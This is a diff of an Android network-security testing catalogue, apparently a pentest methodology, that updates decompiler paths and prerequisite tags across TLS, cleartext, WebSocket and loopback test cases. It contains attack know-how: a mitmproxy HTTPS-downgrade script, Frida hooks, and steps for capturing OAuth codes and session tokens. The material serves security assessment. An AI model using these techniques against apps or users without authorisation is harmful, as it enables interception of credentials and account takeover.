-   "how": "```bash\n# enumerate clients and channels\ngrep -rn 'OkHttpClient(\\|new OkHttpClient\\|Retrofit.Builder\\|HttpURLConnection\\|HttpsURLConnection\\|Volley\\|Cronet\\|WebView(\\|DownloadManager\\|MediaPlayer\\|ExoPlayer\\|WebSocket' jadx_out/sources/ \\\n  | grep -viE '^jadx_out/sources/(android|androidx)/' | sort -u\n# then, per host, try a wrong-CN cert only for that host:\nmitmproxy --mode transparent --showhost --set upstream_cert=false\n```\nDrive each feature in turn (log in, load a profile image, download an attachment, play media, open\nthe help WebView) with the wrong-CN certificate scoped to that host only.",
+   "how": "```bash\n# enumerate clients and channels\ngrep -rn 'OkHttpClient(\\|new OkHttpClient\\|Retrofit.Builder\\|HttpURLConnection\\|HttpsURLConnection\\|Volley\\|Cronet\\|WebView(\\|DownloadManager\\|MediaPlayer\\|ExoPlayer\\|WebSocket' $DEC/jadx/sources/ \\\n  | grep -viE '^$DEC/jadx/sources/(android|androidx)/' | sort -u\n# then, per host, try a wrong-CN cert only for that host:\nmitmproxy --mode transparent --showhost --set upstream_cert=false\n```\nDrive each feature in turn (log in, load a profile image, download an attachment, play media, open\nthe help WebView) with the wrong-CN certificate scoped to that host only.",
    "proof": "A per-channel table in the report: host → stack → outcome (rejected / accepted wrong CN /\naccepted untrusted CA / cleartext). One accepted row is the finding; the table is what makes the\nvendor's \"we validate\" answer untenable.",
    "escalation": "The weakest channel sets the ceiling — an image loader that accepts anything is a\ncontent-injection primitive into whatever renders it (→ D10, D16).",
    "ruled_out_when": "Every enumerated channel rejects both an untrusted CA and a wrong-CN certificate,\nand the channel list is complete against the pcap host list from D14-004."
@@ -576,8 +596,10 @@
     "AM-06"
    ],
    "applies_to": "all apps with a WebView",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "webview",
+   "requires_tags": [
+    "webview"
+   ],
    "maps_to": "MASWE-0027, CWE-295, Google ASI campaign \"Webview SSLErrorHandler\" (2015-07-17), H1 #795272 (Razer, $750), ATT&CK T1638",
    "record": "",
    "legacy_meta": {},
@@ -605,7 +627,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "An app can validate correctly on its API client and still ship a WebView that proceeds\nthrough certificate errors. This is the highest-signal single grep in the domain.",
-   "how": "```bash\ngrep -rn -A8 'onReceivedSslError' jadx_out/sources/ | grep -n 'proceed()'\ngrep -rn 'onReceivedSslError\\|SslErrorHandler' jadx_out/sources/ | grep -viE '^jadx_out/sources/(android|androidx)/'\ngrep -rn -A8 'onReceivedClientCertRequest' jadx_out/sources/   # the mTLS sibling\n```\nRead the body: a `proceed()` gated on a user dialog is weaker but defensible; an unconditional\n`handler.proceed()` — or one gated on `BuildConfig.DEBUG` that still evaluates true — is the finding.",
+   "how": "```bash\ngrep -rn -A8 'onReceivedSslError' $DEC/jadx/sources/ | grep -n 'proceed()'\ngrep -rn 'onReceivedSslError\\|SslErrorHandler' $DEC/jadx/sources/ | grep -viE '^$DEC/jadx/sources/(android|androidx)/'\ngrep -rn -A8 'onReceivedClientCertRequest' $DEC/jadx/sources/   # the mTLS sibling\n```\nRead the body: a `proceed()` gated on a user dialog is weaker but defensible; an unconditional\n`handler.proceed()` — or one gated on `BuildConfig.DEBUG` that still evaluates true — is the finding.",
    "proof": "WebView content served from your proxy with an **untrusted** certificate, with no\nuser-visible warning, and the app's session cookie present in the request. Screenshot the rendered\npage plus the proxy entry.",
    "escalation": "Own the WebView's origin → the JS bridge behind it (→ D10). This is the cheapest\nprecondition in the whole bridge-exploitation chain, because it needs no deep link and no XSS.",
    "ruled_out_when": "No `onReceivedSslError` override exists (the platform default cancels the load),\nor the override calls `handler.cancel()` on every path, verified by serving an untrusted certificate\nand observing `net::ERR_CERT_AUTHORITY_INVALID` with the load aborted."
@@ -654,7 +676,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "`HttpsURLConnection.setDefaultHostnameVerifier(...)` and\n`HttpsURLConnection.setDefaultSSLSocketFactory(...)` are **process-global**. One SDK calling either\nwith a permissive implementation compromises every connection in the process — including the app's own\npinned ones — and the app's own code will look clean.",
-   "how": "```bash\ngrep -rn 'setDefaultHostnameVerifier\\|setDefaultSSLSocketFactory\\|SSLContext.setDefault' jadx_out/sources/ \\\n  | grep -viE '^jadx_out/sources/(android|androidx)/'\n# attribute the hit to a package, then to a Maven coordinate:\nunzip -l base.apk | grep -iE 'META-INF/.*\\.version'\nunzip -p base.apk 'META-INF/*.version' 2>/dev/null\n```\nRuntime attribution — log the caller, not just the call:\n```javascript\nJava.perform(function () {\n  var H = Java.use('javax.net.ssl.HttpsURLConnection');\n  H.setDefaultHostnameVerifier.implementation = function (v) {\n    console.log('[GLOBAL VERIFIER] ' + v.$className + '\\n' +\n      Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));\n    return this.setDefaultHostnameVerifier(v); };\n});\n```",
+   "how": "```bash\ngrep -rn 'setDefaultHostnameVerifier\\|setDefaultSSLSocketFactory\\|SSLContext.setDefault' $DEC/jadx/sources/ \\\n  | grep -viE '^$DEC/jadx/sources/(android|androidx)/'\n# attribute the hit to a package, then to a Maven coordinate:\nunzip -l base.apk | grep -iE 'META-INF/.*\\.version'\nunzip -p base.apk 'META-INF/*.version' 2>/dev/null\n```\nRuntime attribution — log the caller, not just the call:\n```javascript\nJava.perform(function () {\n  var H = Java.use('javax.net.ssl.HttpsURLConnection');\n  H.setDefaultHostnameVerifier.implementation = function (v) {\n    console.log('[GLOBAL VERIFIER] ' + v.$className + '\\n' +\n      Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));\n    return this.setDefaultHostnameVerifier(v); };\n});\n```",
    "proof": "The decompiled method body showing the permissive implementation, the stack trace naming\nthe SDK package, **and** a Burp intercept of the **app's own** API traffic (not merely the SDK's)\nsucceeding with a CA installed nowhere.",
    "escalation": "→ D18 (third-party SDK inventory), → D13 (credential capture). Report it against the\napp; the app ships the SDK.",
    "ruled_out_when": "No global setter is called outside `android.*`/`androidx.*`, or the installed\nglobal delegates to the platform default and a self-signed cert is still rejected on every channel."
@@ -700,7 +722,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Version alone is informational. The reachability condition is whether the app or an SDK makes\n**manual** verifier calls; code relying purely on OkHttp's internal default path is less affected.\nPin the exact version and the exact call site before you write anything.",
-   "how": "```bash\nunzip -p base.apk 'META-INF/okhttp*.version' 2>/dev/null\ngrep -rn 'okhttp3/internal/Version\\|OkHttp/' jadx_out/sources/ | head\ngrep -rn 'hostnameVerifier(\\|OkHostnameVerifier\\|HostnameVerifier' jadx_out/sources/ | grep -viE '^jadx_out/sources/(android|androidx)/'\ngrep -rn 'com.squareup.okhttp3\\|com.squareup.okio' --include='*.gradle*' --include='*.toml' .   # if source is available\n```\nThen serve a certificate whose CN/SAN is a non-ASCII / IDN-confusable form of the real host and drive\nthe manual-verifier path.",
+   "how": "```bash\nunzip -p base.apk 'META-INF/okhttp*.version' 2>/dev/null\ngrep -rn 'okhttp3/internal/Version\\|OkHttp/' $DEC/jadx/sources/ | head\ngrep -rn 'hostnameVerifier(\\|OkHostnameVerifier\\|HostnameVerifier' $DEC/jadx/sources/ | grep -viE '^$DEC/jadx/sources/(android|androidx)/'\ngrep -rn 'com.squareup.okhttp3\\|com.squareup.okio' --include='*.gradle*' --include='*.toml' .   # if source is available\n```\nThen serve a certificate whose CN/SAN is a non-ASCII / IDN-confusable form of the real host and drive\nthe manual-verifier path.",
    "proof": "All three together: the version string `< 4.9.2`, a jadx hit on an app/SDK-level\n`hostnameVerifier(...)` call, and a Burp session where the confusable-hostname certificate is accepted\n(a 200 with app data, **not** `SSLPeerUnverifiedException` in logcat).",
    "escalation": "MitM of authenticated API traffic → D15. Check the okio coordinate independently —\nOkHttp 4.11.0 shipped a vulnerable okio, so \"we upgraded OkHttp\" does not close CVE-2023-3635.",
    "ruled_out_when": "The bundled OkHttp is ≥ 4.9.2, **or** there is no manual verifier call anywhere\noutside `android.*`/`androidx.*` and the confusable-hostname certificate is rejected."
@@ -744,7 +766,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Three things look alike in decompiled code and only one is a bug: (a) an empty\n`checkServerTrusted` that trusts everything — a genuine vulnerability; (b) a shim that delegates to\nthe platform default, typically installed to enable TLS 1.2 on API ≤ 21 — **not** a vulnerability;\n(c) real pinning. Worked calibration from the corpus: one large e-commerce app's main API had no\npinning at all, only a TLS-1.2 shim using the system default for API ≤ 21 — reporting that as\ntrust-all would have been a retraction.",
-   "how": "```bash\ngrep -rn -A15 'checkServerTrusted' jadx_out/sources/ | less\n# a DELEGATING shim looks like: TrustManagerFactory.getInstance(getDefaultAlgorithm()); init((KeyStore)null);\ngrep -rn -B6 -A6 'TrustManagerFactory.getInstance' jadx_out/sources/\ngrep -rn 'setEnabledProtocols\\|TLSv1.2\\|Tls12SocketFactory\\|ProviderInstaller' jadx_out/sources/\n```\nThe decisive dynamic test is the certificate you present: use a **self-signed certificate for the\nwrong hostname, with your CA not installed**. A correctly-configured app rejects it; a trust-all app\naccepts it. Your CA-signed proxy certificate would be accepted by *both* once the CA is installed, so\nit proves nothing.",
+   "how": "```bash\ngrep -rn -A15 'checkServerTrusted' $DEC/jadx/sources/ | less\n# a DELEGATING shim looks like: TrustManagerFactory.getInstance(getDefaultAlgorithm()); init((KeyStore)null);\ngrep -rn -B6 -A6 'TrustManagerFactory.getInstance' $DEC/jadx/sources/\ngrep -rn 'setEnabledProtocols\\|TLSv1.2\\|Tls12SocketFactory\\|ProviderInstaller' $DEC/jadx/sources/\n```\nThe decisive dynamic test is the certificate you present: use a **self-signed certificate for the\nwrong hostname, with your CA not installed**. A correctly-configured app rejects it; a trust-all app\naccepts it. Your CA-signed proxy certificate would be accepted by *both* once the CA is installed, so\nit proves nothing.",
    "proof": "Either the app completes the request against the self-signed wrong-CN certificate (→ file\nD14-007/D14-009), or it does not (→ the shim is benign; record it as ruled out).",
    "escalation": "n/a — this is a kill gate. It is the TLS analogue of the layer-ordering trap.",
    "ruled_out_when": "The shim's terminal delegate is a `TrustManagerFactory` initialised with `null`\nand the self-signed wrong-CN test fails — record \"custom TrustManager present, delegates to system\nanchors, validated by negative MitM on <date>\" in the ruled-out register."
@@ -798,7 +820,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Determine whether HTTP is *allowed*, and by which mechanism, with the API-level default\nstated. On a modern target this is a deliberate opt-out and that fact is the strongest sentence in the\nfinding; on a low-targetSdk app it is the platform default and is worth far less on its own.",
-   "how": "```bash\ngrep -iE 'usesCleartextTraffic|networkSecurityConfig' apktool_out/AndroidManifest.xml\naapt2 dump badging base.apk | grep targetSdkVersion\nyq -p=xml -o=json -r '.\"network-security-config\".\"base-config\".\"+@cleartextTrafficPermitted\" // \"\"' \\\n   apktool_out/res/xml/network_security_config.xml\nyq -p=xml -o=json '.' apktool_out/res/xml/network_security_config.xml | \\\n  jq -r '.[\"network-security-config\"][\"domain-config\"][]? | {domain, cleartext: .[\"+@cleartextTrafficPermitted\"]}'\n```",
+   "how": "```bash\ngrep -iE 'usesCleartextTraffic|networkSecurityConfig' $DEC/apktool/AndroidManifest.xml\naapt2 dump badging base.apk | grep targetSdkVersion\nyq -p=xml -o=json -r '.\"network-security-config\".\"base-config\".\"+@cleartextTrafficPermitted\" // \"\"' \\\n   $DEC/apktool/res/xml/network_security_config.xml\nyq -p=xml -o=json '.' $DEC/apktool/res/xml/network_security_config.xml | \\\n  jq -r '.[\"network-security-config\"][\"domain-config\"][]? | {domain, cleartext: .[\"+@cleartextTrafficPermitted\"]}'\n```",
    "proof": "MASTG's exact failing conditions, quoted in the report: (1) manifest sets\n`usesCleartextTraffic=\"true\"` **and there is no NSC**; (2) the NSC sets `cleartextTrafficPermitted=\"true\"`\nin `<base-config>`; (3) the NSC sets it `true` in any `<domain-config>`. The non-failing edge case you\nmust know before you file: manifest `true` **plus** an NSC — even an empty\n`<network-security-config></network-security-config>` — does **not** fail, because the NSC overrides\nthe manifest flag entirely.",
    "escalation": "Pair with D14-018 (traffic observed) and report the credential, not the flag. A\ncleartext domain that serves code/config is D17 and a different severity entirely.",
    "ruled_out_when": "`targetSdk ≥ 28`, no `usesCleartextTraffic=\"true\"`, and no\n`cleartextTrafficPermitted=\"true\"` in `base-config` or any `domain-config` — plus a pcap containing no\nTCP/80 conversation from the app's UID across a full feature walk."
@@ -818,8 +840,10 @@
     "AM-06"
    ],
    "applies_to": "`targetSdk ≥ 28` apps with an NSC (API 24+)",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "targetsdk>=28",
+   "requires_tags": [
+    "targetsdk>=28"
+   ],
    "maps_to": "MASTG-TEST-0235, MASWE-0026, MASTG-TECH-0151, MobSF `network_security.py` finding \"Domain config is insecurely configured to permit clear text traffic\"",
    "record": "",
    "legacy_meta": {},
@@ -848,7 +872,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The global default being secure hides the per-domain exception. Enumerate every\n`<domain-config>` and classify its domains: first-party API / auth / analytics / CDN. The common\nshortcut is an \"analytics\" carve-out that then carries the advertising id and the user id.",
-   "how": "```bash\npython3 - <<'PY'\nimport glob, xml.dom.minidom as m\nfor f in glob.glob('apktool_out/res/xml/*.xml'):\n    try: d = m.parse(f)\n    except Exception: continue\n    if not d.getElementsByTagName('network-security-config'): continue\n    for sec in ('base-config','domain-config','debug-overrides'):\n        for c in d.getElementsByTagName(sec):\n            doms=[x.firstChild.nodeValue for x in c.getElementsByTagName('domain')]\n            print(sec, doms or ['*'], 'cleartext=', c.getAttribute('cleartextTrafficPermitted') or '-')\n            for cert in c.getElementsByTagName('certificates'):\n                print('   trust-anchor src=', cert.getAttribute('src'),\n                      'overridePins=', cert.getAttribute('overridePins') or '-')\n            for ps in c.getElementsByTagName('pin-set'):\n                print('   pin-set expiration=', ps.getAttribute('expiration') or 'NONE',\n                      [p.firstChild.nodeValue for p in ps.getElementsByTagName('pin')])\nPY\n```\nThen exercise the feature that talks to each carved-out domain and capture.",
+   "how": "```bash\npython3 - <<'PY'\nimport glob, xml.dom.minidom as m\nfor f in glob.glob('$DEC/apktool/res/xml/*.xml'):\n    try: d = m.parse(f)\n    except Exception: continue\n    if not d.getElementsByTagName('network-security-config'): continue\n    for sec in ('base-config','domain-config','debug-overrides'):\n        for c in d.getElementsByTagName(sec):\n            doms=[x.firstChild.nodeValue for x in c.getElementsByTagName('domain')]\n            print(sec, doms or ['*'], 'cleartext=', c.getAttribute('cleartextTrafficPermitted') or '-')\n            for cert in c.getElementsByTagName('certificates'):\n                print('   trust-anchor src=', cert.getAttribute('src'),\n                      'overridePins=', cert.getAttribute('overridePins') or '-')\n            for ps in c.getElementsByTagName('pin-set'):\n                print('   pin-set expiration=', ps.getAttribute('expiration') or 'NONE',\n                      [p.firstChild.nodeValue for p in ps.getElementsByTagName('pin')])\nPY\n```\nThen exercise the feature that talks to each carved-out domain and capture.",
    "proof": "The exact XML stanza, the domain, and a captured HTTP request to it containing an\nidentifier, token or PII. Quote the stanza verbatim — on a `targetSdk ≥ 28` app it is documented\nintent, not an oversight.",
    "escalation": "→ D20 (identifiers to a third party in clear), → D13 if the carve-out domain\nparticipates in auth, → D17 if it serves config or assets the app trusts.",
    "ruled_out_when": "Every `<domain-config cleartextTrafficPermitted=\"true\">` domain is demonstrably a\nnon-first-party static asset host and the captured traffic to it carries no identifier, cookie or\ntoken — record the domain list and the captured request set as the negative."
@@ -868,8 +892,11 @@
     "AM-06"
    ],
    "applies_to": "all",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, mitm",
+   "requires_tags": [
+    "device",
+    "mitm"
+   ],
    "maps_to": "MASTG-TEST-0236, MASWE-0026, MASTG-TECH-0010, MASTG-TECH-0011, MASTG-TECH-0028, MASTG-TOOL-0075, MASTG-TOOL-0081, MASTG-TOOL-0078 (MITM Relay, for non-HTTP protocols such as XMPP), CWE-319, ATT&CK T1639.001, mitigation M1009; H1 #12977, #166712 (Boozt, login without SSL), #2101 (Yahoo, signup over HTTP)",
    "record": "",
    "legacy_meta": {},
@@ -960,7 +987,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "MASTG is explicit that presence is not enough: \"The presence of HTTP URLs alone does not\nnecessarily mean they are actively used.\" Find them, xref them to a connection-creating call, prove\nthe request on the wire — **and check whether each hardcoded host is still registered**. EDB 42288 is\nthe reason: the app hardcoded `http://www.comparison.net.au` and the domain was unregistered, so no\nMitM position was needed at all and the attacker model collapses from AM-06 to AM-01.",
-   "how": "```bash\ngrep -rIoE 'http://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+' apktool_out/ jadx_out/sources/ \\\n  | grep -viE 'schemas\\.android|w3\\.org|apache\\.org|xmlpull|localhost|127\\.0\\.0\\.1|example\\.(com|org)' | sort -u\nrabin2 -zz lib/*/*.so | grep 'http://'\n# registration / takeover check for every distinct host:\nfor h in $(cat hosts.txt); do whois \"$h\" 2>/dev/null | grep -qiE 'no match|not found|NOT FOUND' \\\n  && echo \"UNREGISTERED: $h\"; done\ndig +short <host>\n```\nRuntime confirmation with attribution to a code location:\n```javascript\nJava.perform(function () {\n  var U = Java.use('java.net.URL');\n  U.openConnection.overload().implementation = function () {\n    var s = this.toString();\n    if (s.indexOf('http://') === 0)\n      console.log('[CLEARTEXT] ' + s + '\\n' + Java.use('android.util.Log')\n        .getStackTraceString(Java.use('java.lang.Exception').$new()));\n    return this.openConnection(); };\n});\n```",
+   "how": "```bash\ngrep -rIoE 'http://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+' $DEC/apktool/ $DEC/jadx/sources/ \\\n  | grep -viE 'schemas\\.android|w3\\.org|apache\\.org|xmlpull|localhost|127\\.0\\.0\\.1|example\\.(com|org)' | sort -u\nrabin2 -zz lib/*/*.so | grep 'http://'\n# registration / takeover check for every distinct host:\nfor h in $(cat hosts.txt); do whois \"$h\" 2>/dev/null | grep -qiE 'no match|not found|NOT FOUND' \\\n  && echo \"UNREGISTERED: $h\"; done\ndig +short <host>\n```\nRuntime confirmation with attribution to a code location:\n```javascript\nJava.perform(function () {\n  var U = Java.use('java.net.URL');\n  U.openConnection.overload().implementation = function () {\n    var s = this.toString();\n    if (s.indexOf('http://') === 0)\n      console.log('[CLEARTEXT] ' + s + '\\n' + Java.use('android.util.Log')\n        .getStackTraceString(Java.use('java.lang.Exception').$new()));\n    return this.openConnection(); };\n});\n```",
    "proof": "The constant, the backtrace showing the call site, and the request captured on the wire —\nor, for the unregistered case, the WHOIS output plus the app connecting to a host you then register or\npoint at yourself.",
    "escalation": "A cleartext page loaded into a bridged WebView is the classic MitM→bridge RCE chain\n(→ D10); a cleartext config/update fetch is → D17.",
    "ruled_out_when": "Every `http://` constant is a namespace URI, a comment, an unreferenced resource\nstring, or is xref'd only to code behind a dead feature flag — and no `http://` request appears under\nthe Frida `openConnection` hook across a full feature walk."
@@ -981,8 +1008,10 @@
     "AM-06"
    ],
    "applies_to": "apps with real-time features — chat, live orders, trading, presence, notifications",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "MASWE-0026, CWE-319; corpus community sources on WebSocket transport and Pusher/PubNub/Ably SDK channels",
    "record": "",
    "legacy_meta": {},
@@ -1010,7 +1039,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Two separate bugs. (a) The socket URL is `ws://`, so the whole channel is in clear including\nthe token used to open it. (b) The socket is `wss://` but the server authorises only at connection\ntime and then trusts every frame — send a frame referencing another user's object id.",
-   "how": "```bash\ngrep -rn \"ws://\\|wss://\\|WebSocketListener\\|newWebSocket\\|okhttp3.WebSocket\\|Socket\\.io\\|Pusher\\|PubNub\\|Ably\" jadx_out/sources/\ntshark -r cap.pcap -Y 'websocket' -T fields -e ip.dst -e tcp.dstport -e websocket.payload\n# Burp: WebSockets history -> select a frame -> edit the object id -> re-send\n```",
+   "how": "```bash\ngrep -rn \"ws://\\|wss://\\|WebSocketListener\\|newWebSocket\\|okhttp3.WebSocket\\|Socket\\.io\\|Pusher\\|PubNub\\|Ably\" $DEC/jadx/sources/\ntshark -r cap.pcap -Y 'websocket' -T fields -e ip.dst -e tcp.dstport -e websocket.payload\n# Burp: WebSockets history -> select a frame -> edit the object id -> re-send\n```",
    "proof": "For (a) a captured `ws://` upgrade request carrying the session token. For (b) a WebSocket\nframe for another user's resource id returning that user's data — compare response **bodies**, not\nframe counts.",
    "escalation": "→ D15 (BOLA over a channel most testers skip entirely), → D13 if the upgrade request\ncarries the session token in the URL.",
    "ruled_out_when": "All socket URLs are `wss://`, the upgrade carries the token in a header rather\nthan the query string, and a frame naming a foreign object id returns an authorisation error rather\nthan data."
@@ -1030,8 +1059,11 @@
     "AM-06"
    ],
    "applies_to": "all; OkHttp's `followSslRedirects` defaults to **true**",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "mitm, backend-api",
+   "requires_tags": [
+    "mitm",
+    "backend-api"
+   ],
    "maps_to": "MASWE-0026, CWE-319, ATT&CK T1638",
    "record": "",
    "legacy_meta": {},
@@ -1059,7 +1091,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Even a fully HTTPS app can be downgraded if the client follows a cross-scheme redirect, or\nif the very first request of a session is the plain-HTTP one that gets redirected. `OkHttpClient` sets\n`followSslRedirects(true)` by default, and the NSC will not stop the resulting request if any domain\ncarve-out permits cleartext.",
-   "how": "```bash\ngrep -rn 'followSslRedirects\\|followRedirects\\|setInstanceFollowRedirects\\|HttpURLConnection.setFollowRedirects' jadx_out/sources/\n# in the proxy, answer a first-party request with a downgrade:\n#   HTTP/1.1 302 Found\n#   Location: http://api.target.tld/v1/session\n```\nWith mitmproxy:\n```python\n# downgrade.py -- mitmdump -s downgrade.py\ndef response(flow):\n    if flow.request.pretty_host.endswith(\"target.tld\") and flow.response.status_code == 200:\n        flow.response.status_code = 302\n        flow.response.headers[\"Location\"] = \"http://\" + flow.request.pretty_host + flow.request.path\n```",
+   "how": "```bash\ngrep -rn 'followSslRedirects\\|followRedirects\\|setInstanceFollowRedirects\\|HttpURLConnection.setFollowRedirects' $DEC/jadx/sources/\n# in the proxy, answer a first-party request with a downgrade:\n#   HTTP/1.1 302 Found\n#   Location: http://api.target.tld/v1/session\n```\nWith mitmproxy:\n```python\n# downgrade.py -- mitmdump -s downgrade.py\ndef response(flow):\n    if flow.request.pretty_host.endswith(\"target.tld\") and flow.response.status_code == 200:\n        flow.response.status_code = 302\n        flow.response.headers[\"Location\"] = \"http://\" + flow.request.pretty_host + flow.request.path\n```",
    "proof": "The follow-up request appearing over plain HTTP in the capture, carrying the same\n`Authorization`/`Cookie` header — that is the token in clear, obtained without breaking TLS at all.",
    "escalation": "→ D13. This is often the only cleartext a modern app will produce, and it is the\nversion of the finding an AM-06 attacker can actually cause.",
    "ruled_out_when": "`followSslRedirects(false)` is set on every client, or the downgrade response\nproduces an error/abort in logcat and no HTTP request follows."
@@ -1079,8 +1111,15 @@
     "AM-06"
    ],
    "applies_to": "Flutter (Dart `HttpClient` on its own BoringSSL and its own CA list), Unity (`UnityWebRequest`), Cronet, gRPC, Go and any bundled native stack; Capacitor's `server.cleartext`",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "native, flutter, unity, capacitor, cordova, kmp",
+   "requires_tags": [
+    "native",
+    "flutter",
+    "unity",
+    "capacitor",
+    "cordova",
+    "kmp"
+   ],
    "maps_to": "MASTG-TECH-0151, MASWE-0026, CWE-319; corpus: Dart's compiled-in CA list (`session_verify_cert_chain` in `x509.cc`), Capacitor `WebViewLocalServer`",
    "record": "",
    "legacy_meta": {},
@@ -1108,7 +1147,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A Network Security Configuration that forbids cleartext constrains the platform\n`HttpsURLConnection`/OkHttp path. It does not constrain Dart's `HttpClient`, Unity's web request, or a\nnative stack. Never conclude \"cleartext is impossible\" from the NSC alone — prove it empirically.",
-   "how": "```bash\nunzip -l base.apk | grep -iE 'libflutter\\.so|libapp\\.so|libmonodroid|libunity|libcronet|libgojni|libcurl'\ngrep -n 'networkSecurityConfig\\|usesCleartextTraffic' apktool_out/AndroidManifest.xml\ncat apktool_out/res/xml/network_security_config.xml\npython3 -c \"import json;print(json.load(open('apktool_out/assets/capacitor.config.json')).get('plugins',{}))\" 2>/dev/null\ngrep -rn 'isDomainExcludedFromSSL\\|acceptAllCerts\\|sslPinning\\|\"cleartext\"' apktool_out/assets/ jadx_out/sources/ 2>/dev/null | head\n# empirical:\ntcpdump -i any -n 'tcp port 80'    # on the lab AP/gateway while driving the app\n```",
+   "how": "```bash\nunzip -l base.apk | grep -iE 'libflutter\\.so|libapp\\.so|libmonodroid|libunity|libcronet|libgojni|libcurl'\ngrep -n 'networkSecurityConfig\\|usesCleartextTraffic' $DEC/apktool/AndroidManifest.xml\ncat $DEC/apktool/res/xml/network_security_config.xml\npython3 -c \"import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('plugins',{}))\" 2>/dev/null\ngrep -rn 'isDomainExcludedFromSSL\\|acceptAllCerts\\|sslPinning\\|\"cleartext\"' $DEC/apktool/assets/ $DEC/jadx/sources/ 2>/dev/null | head\n# empirical:\ntcpdump -i any -n 'tcp port 80'    # on the lab AP/gateway while driving the app\n```",
    "proof": "A plaintext HTTP request from the app captured on the wire **despite** an NSC that declares\n`cleartextTrafficPermitted=\"false\"` — put the XML and the packet side by side.",
    "escalation": "The same reasoning applies to the pin set (→ D14-036) and to the trust store: a stack\nthat ignores the NSC usually ignores the system trust store too.",
    "ruled_out_when": "The APK ships no non-platform HTTP stack (no Flutter/Unity/Cronet/Go/libcurl\nbinaries), or a gateway-level TCP/80 capture across a full feature walk is empty."
@@ -1155,7 +1194,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Android does **not** isolate loopback sockets between apps. An app implementing the\ndesktop-style \"local HTTP server on 127.0.0.1 for the OAuth callback\" pattern can have its\nauthorization code captured by any unprivileged app that binds or connects first. Separately, an app\nthat exposes a `ServerSocket` on the LAN is reachable by every device on the network. **Android 16's\nLocal Network Protection restricts LAN access, not loopback — do not assume LNP mitigates the OAuth\ncase.**",
-   "how": "```bash\ngrep -rnE 'ServerSocket|NanoHTTPD|127\\.0\\.0\\.1|localhost|redirect_uri|loopback|MulticastSocket|DatagramSocket|NsdManager|\\.local' jadx_out/sources/\nadb shell ss -lntp 2>/dev/null || adb shell netstat -lntp\nadb shell cat /proc/net/tcp | awk '{print $2, $4, $8}' | head -40     # local_address, state, uid\n# LAN behaviour under the Android 16 gate:\nadb shell am compat enable RESTRICT_LOCAL_NETWORK <pkg>; adb reboot\nadb logcat -d | grep -E 'sendto failed: EPERM|sendto failed: ECONNABORTED'\nadb shell am compat disable RESTRICT_LOCAL_NETWORK <pkg>\n```",
+   "how": "```bash\ngrep -rnE 'ServerSocket|NanoHTTPD|127\\.0\\.0\\.1|localhost|redirect_uri|loopback|MulticastSocket|DatagramSocket|NsdManager|\\.local' $DEC/jadx/sources/\nadb shell ss -lntp 2>/dev/null || adb shell netstat -lntp\nadb shell cat /proc/net/tcp | awk '{print $2, $4, $8}' | head -40     # local_address, state, uid\n# LAN behaviour under the Android 16 gate:\nadb shell am compat enable RESTRICT_LOCAL_NETWORK <pkg>; adb reboot\nadb logcat -d | grep -E 'sendto failed: EPERM|sendto failed: ECONNABORTED'\nadb shell am compat disable RESTRICT_LOCAL_NETWORK <pkg>\n```",
    "proof": "For loopback: a listening port owned by the target's UID during the OAuth flow, plus a\nsuccessful fetch of the callback URL (carrying `code=`) from a second, unprivileged process. For LAN:\nan unauthenticated request from another device that returns app data — and, under the compat gate, a\nbehavioural diff showing the app falling back to a **less authenticated or cleartext** path when LAN\naccess is denied.",
    "escalation": "Authorization code → token exchange (worse when PKCE is absent or the verifier is\npredictable) → D13 account takeover. Degradation-under-denial is its own finding.",
    "ruled_out_when": "No `ServerSocket`/`NanoHTTPD` bind occurs during any flow (`/proc/net/tcp` shows\nno LISTEN row for the app's UID at any point), and the OAuth redirect uses a custom scheme or an App\nLink rather than a loopback URI."
@@ -1175,8 +1214,11 @@
     "AM-06"
    ],
    "applies_to": "all; especially messaging, IoT-companion, gaming and finance apps",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, mitm",
+   "requires_tags": [
+    "device",
+    "mitm"
+   ],
    "maps_to": "ATT&CK T1509 Non-Standard Port (precedents named by ATT&CK: Cerberus \"HTTP requests over port 8888\", Chameleon \"port 7242\", FlexiSpy \"ports 12512 and 12514\"), T1437.001, T1521, MASTG-TOOL-0078 (MITM Relay for XMPP-class protocols)",
    "record": "",
    "legacy_meta": {},
@@ -1202,7 +1244,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "MQTT, XMPP, raw TCP, gRPC over h2c, WebSocket on an odd port and QUIC/UDP routinely carry\nthe most sensitive payloads and get the least testing, because an HTTP proxy never shows them.",
-   "how": "```bash\ntshark -r cap.pcap -q -z conv,tcp | sort -k2 | head -40\ntshark -r cap.pcap -Y 'quic || mqtt || websocket || xmpp' \\\n  -T fields -e ip.dst -e tcp.dstport -e udp.dstport | sort -u\ngrep -rn -i 'mqtt\\|xmpp\\|Socket(\\|SSLSocketFactory\\|grpc\\|QuicChannel\\|cronet\\|newWebSocket' jadx_out/sources/\n# relay a non-HTTP TLS protocol through your proxy:\n#   MITM Relay (MASTG-TOOL-0078) in front of the app's target host:port\n```",
